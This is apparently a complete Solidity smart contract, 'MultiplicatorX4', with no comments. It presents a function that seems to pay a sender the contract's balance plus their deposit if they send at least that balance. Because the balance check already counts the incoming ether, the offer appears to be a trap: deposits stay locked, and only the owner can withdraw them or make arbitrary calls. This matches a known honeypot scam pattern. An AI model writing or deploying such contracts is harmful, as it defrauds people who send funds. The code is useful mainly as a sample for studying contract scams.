pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner;

    function MultiplicatorX4() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        require(msg.value >= this.balance);

        adr.transfer(this.balance + msg.value);
    }
}